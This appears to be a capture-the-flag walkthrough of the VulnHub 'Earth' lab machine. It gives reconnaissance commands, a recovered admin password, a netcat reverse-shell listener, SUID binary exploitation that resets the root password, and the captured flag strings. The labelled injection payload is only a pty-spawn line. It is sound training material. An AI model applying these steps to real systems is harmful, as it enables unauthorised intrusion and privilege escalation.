# The Planets: Earth — CTF Writeup

> VulnHub Machine Walkthrough  
> Target OS: Fedora Linux  
> Author: SirFlash

---

# Overview

This writeup documents my personal steps to the completion of the exploitation process of the **Earth** machine from the *The Planets* series on VulnHub. The engagement covered:

- Network reconnaissance
- Web enumeration
- Credential recovery
- Command injection exploitation
- Reverse shell access
- Privilege escalation via a vulnerable SUID binary

The objective was to obtain both user and root access.

---
# Screenshots 
<table>
<tr>
<td><img src="https://github.com/user-attachments/assets/b6b8cad4-e8c7-4bc9-8361-dea9e14e4dcc" width="300"></td>
<td><img src="https://github.com/user-attachments/assets/abc705a7-8461-42f6-8006-a05aba14925e" width="300"></td>
<td><img src="https://github.com/user-attachments/assets/08e4f3a9-22e5-4d13-b376-2d7d855c6333" width="300"></td>
</tr>

<tr>
<td><img src="https://github.com/user-attachments/assets/f8fb2a8b-ca48-4eb1-a2d2-acfc7dd80a57" width="300"></td>
<td><img src="https://github.com/user-attachments/assets/b584e1fb-38fd-42fa-8b7d-446f832f3c74" width="300"></td>
<td><img src="https://github.com/user-attachments/assets/d3d63925-ccef-4c65-b7c2-486a447225cc" width="300"></td>
</tr>

<tr>
<td><img src="https://github.com/user-attachments/assets/a486d1e2-c83c-48a5-9cfa-67a4374081ad" width="300"></td>
<td><img src="https://github.com/user-attachments/assets/00ff37de-7f98-4d1c-91a2-34e3a92467cf" width="300"></td>
<td><img src="https://github.com/user-attachments/assets/6dfd23cc-06d7-4a5f-9aeb-f591c590beb9" width="300"></td>
</tr>

<tr>
<td><img src="https://github.com/user-attachments/assets/16ee804d-feac-4f43-86c2-8ec502109625" width="300"></td>
</tr>
</table>

# Target Information

| Category | Details |
|---|---|
| Platform | VulnHub |
| Machine | Earth |
| Difficulty | Easy |
| Operating System | Fedora Linux |
| Target IP | `192.168.56.101` |
| Flags Captured | `2 / 2` |

---

# Tools Used

- `netdiscover`
- `nmap`
- `dirb`
- `CyberChef`
- `netcat`
- `find`
- `strings`
- `objdump`
- `su`

---

# Reconnaissance

## Network Discovery

```bash
netdiscover -r [REDACTED]/16
```

Target identified:

```text
192.168.56.101
```

---

## Port Scanning

```bash
nmap -sV 192.168.56.101
```

### Open Ports

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |

TLS certificate revealed:

```text
terratest.earth.local
```

---

## Hostname Resolution

```bash
sudo nano /etc/hosts
```

Add:

```text
192.168.56.101 earth.local terratest.earth.local
```

---

# Web Enumeration

## Directory Enumeration

```bash
dirb http://earth.local/
```

### Discovered Directories

| Path | Description |
|---|---|
| `/admin` | Login panel |
| `/cgi-bin` | CGI scripts |

---

## robots.txt Discovery

```text
https://terratest.earth.local/robots.txt
```

---

## Sensitive File Disclosure

### testingnotes.txt

Exposed:

- Internal developer notes
- Encryption hints
- Username disclosure

Recovered username:

```text
terra
```

---

### testdata.txt

XOR-encrypted hexadecimal data was decrypted in CyberChef.

Recovered password:

```text
earthclimatechangebad4humans
```

---

# Initial Access

## Admin Panel Authentication

```text
Username: terra
Password: earthclimatechangebad4humans
```

---

## Command Injection

Listener:

```bash
nc -lvnp 87
```

Payload:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Reverse Shell

```text
bash-5.1$
```

---

# Privilege Escalation

## SUID Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

Interesting binary:

```text
/usr/bin/reset_root
```

---

## Binary Analysis

### strings

```bash
strings /usr/bin/reset_root
```

### objdump

```bash
objdump -d /usr/bin/reset_root
```

Required trigger files:

```text
/dev/shm/kHgTFI5G
/dev/shm/Zw7bV9U5
/tmp/kcM0Wewe
```

---

## Exploitation

```bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

Execute binary:

```bash
/usr/bin/reset_root
```

Root password reset to:

```text
Earth
```

---

## Root Access

```bash
su root
```

Password:

```text
Earth
```

Root shell:

```text
[root@earth /]#
```

---

# Vulnerabilities Identified

| Vulnerability | Impact |
|---|---|
| Information Disclosure | Developer notes exposed |
| Weak Encryption | XOR-encrypted credentials |
| Insecure Admin Functionality | Command execution exposed |
| OS Command Injection | Remote code execution |
| Misconfigured SUID Binary | Privilege escalation |
| Hardcoded Credentials | Root password reset |

---

# Conclusion

The Earth machine demonstrates how multiple vulnerabilities can chain together into full system compromise.

Attack path:

1. Information disclosure
2. Credential recovery
3. Command injection
4. Reverse shell access
5. SUID privilege escalation

Both user and root access were successfully obtained.

---
Both flags were successfully captured during the engagement, confirming full compromise of the target system. After exploiting the vulnerable admin functionality and escalating privileges through the misconfigured SUID binary, root-level access to the Fedora host was obtained. The user flag was recovered from the terra account, and the root flag was retrieved after resetting the root password and switching to the root user.

```text
User Flag: user_flag_3353b67d6437f07ba7d34afd7d2fc27d
Root Flag: root_flag_b0da9554d29db2117b02aa8b66ec492e
```

This machine demonstrates how information disclosure, weak encryption practices, insecure command execution, and improper SUID configurations can be chained together to achieve complete system compromise.


# Credits

## Machine Author

SirFlash 

## Platform

VulnHub - https://www.vulnhub.com/

## Writeup Author

**Assan Jallow**  
CTF Practitioner · Penetration Testing

